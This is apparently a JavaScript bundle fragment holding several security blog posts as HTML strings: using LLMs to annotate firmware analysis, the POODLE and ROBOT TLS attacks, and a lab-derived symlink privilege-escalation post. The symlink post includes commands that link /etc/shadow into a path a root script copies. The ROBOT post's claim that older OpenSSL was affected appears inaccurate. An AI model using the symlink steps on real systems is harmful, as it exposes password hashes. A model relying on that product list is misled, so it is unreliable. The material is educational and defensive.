    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,ty=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,sy=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ry=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,iy=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
